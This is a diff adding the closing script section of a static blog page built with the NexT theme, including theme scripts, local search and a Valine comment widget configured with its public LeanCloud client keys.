+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'EbJd2uGnZROX6CGHpkKNkBAj-gzGzoHsz',
+      appKey     : 'KXq3KsjxZ28WDhwbOrLlm4Yw',
+      placeholder: "快来评论叭",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : 'https://ebjd2ugn.lc-cn-n1-shared.com'
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
